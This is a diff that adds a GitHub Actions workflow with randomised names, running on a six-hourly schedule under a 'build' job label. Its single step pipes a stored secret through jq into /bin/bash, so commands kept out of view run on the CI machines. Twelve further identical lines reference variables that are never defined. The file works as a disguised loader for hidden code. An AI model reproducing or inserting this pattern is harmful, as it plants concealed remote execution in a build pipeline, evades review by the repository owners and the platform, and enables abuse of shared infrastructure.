@@ -1,0 +1,29 @@
+name: xiangdangzheng4389
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangdangzheng4389
+        env:
+          cgwr971: ${{ secrets.cgwr971 }}
+        run: |
+          echo $cgwr971 | jq -r .diz47218 | /bin/bash
+          echo $zjpzp13 | jq -r .jvyg13 | /bin/bash
+          echo $jphnb045 | jq -r .xs40 | /bin/bash
+          echo $xp99 | jq -r .fne3 | /bin/bash
+          echo $fb932 | jq -r .vlk40896 | /bin/bash
+          echo $cbn3 | jq -r .vow92 | /bin/bash
+          echo $eaoo74 | jq -r .ulzbb49 | /bin/bash
+          echo $xh24 | jq -r .k4 | /bin/bash
+          echo $iikyr2704 | jq -r .cfe2024 | /bin/bash
+          echo $r58674 | jq -r .uq16827 | /bin/bash
+          echo $vyb1758 | jq -r .g5 | /bin/bash
+          echo $hc8 | jq -r .zdbzi0480 | /bin/bash
+          echo $szeh11 | jq -r .j35 | /bin/bash
+
